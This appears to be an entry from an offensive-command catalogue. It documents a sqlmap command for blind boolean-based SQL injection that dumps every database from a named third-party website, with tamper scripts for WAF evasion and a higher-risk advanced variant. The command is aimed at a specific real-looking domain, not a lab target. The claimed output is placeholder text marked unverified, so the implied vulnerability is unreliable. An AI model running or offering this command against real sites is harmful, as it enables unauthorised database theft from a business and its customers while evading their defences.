---
id: cmd-uuid-1
data: >-
  python sqlmap.py -u "http://www.starbucks.com.gt/menu/beverage/detail?id=1"
  --technique=B --dbms=mysql --dump-all --tamper=space2comment --batch
tags:
  - sqli
  - exploitation
type: command
output: >-
  Database schema dumped successfully. Available databases [list]. Tables
  dumped: [table names with structures].
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.067Z'
verified: false
validated: true
submitted: true
---
# sqlmap-blind-injection-dump

## Command

```bash
python sqlmap.py -u "http://www.starbucks.com.gt/menu/beverage/detail?id=1" --technique=B --dbms=mysql --dump-all --tamper=space2comment --batch
```

## Description

This command uses sqlmap to exploit a blind boolean-based SQL injection on a web endpoint, specifying MySQL DBMS, dumping all accessible schema, applying a tamper script for WAF bypass, and running in batch mode without prompts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with injectable parameter | Yes |
| `--technique=B` | Use boolean-based blind SQLi | Yes |
| `--dbms=mysql` | Specify MySQL as the database management system | No (auto-detect) |
| `--dump-all` | Dump all databases and tables | Yes |
| `--tamper=space2comment` | Use tamper script to replace spaces with /**/ for WAF evasion | No |
| `--batch` | Non-interactive mode | No |

## Examples

### Basic Usage

```bash
python sqlmap.py -u "http://example.com/page?id=1" --technique=B --batch
```

### Advanced Usage

```bash
python sqlmap.py -u "http://www.starbucks.com.gt/menu/beverage/detail?id=1" --technique=B --dbms=mysql --dump-all --tamper=space2comment,between --level=3 --risk=2 --batch
```

## Expected Output

Sqlmap will output vulnerability confirmation, detected databases/tables, and dumped schema details like column names and types from several tables, without triggering WAF blocks.

## Related

- [[Related Procedure: Exploit-Blind-SQL-Injection-with-sqlmap]]
